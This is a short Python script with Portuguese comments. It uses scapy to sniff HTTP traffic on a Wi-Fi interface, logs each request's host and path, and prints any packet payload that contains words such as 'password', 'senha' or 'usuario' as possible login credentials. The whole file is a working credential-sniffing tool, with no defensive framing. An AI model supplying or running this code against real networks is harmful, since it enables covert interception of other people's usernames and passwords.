import scapy.all as scapy
from scapy.layers import http

def sniffing(interface):
    scapy.sniff(iface=interface, store=False, prn=processar_pacote)

def processar_pacote(pacote):
    # Verifico se o pacote é HTTP
    if pacote.haslayer(http.HTTPRequest):
        
        print("Requisição: " + str(pacote[http.HTTPRequest].Host) + str(pacote[http.HTTPRequest].Path))
        
        if pacote.haslayer(scapy.Raw):
            conteudo = str(pacote[scapy.Raw].load)
            palavras_de_interesse = ["username", "user", "pass", "password", "email", "senha", "usuario"]

            for palavra in palavras_de_interesse:
                if palavra in conteudo:
                    print("Possivel usuário e senha: " + str(conteudo))
                    break


sniffing('Wi-Fi')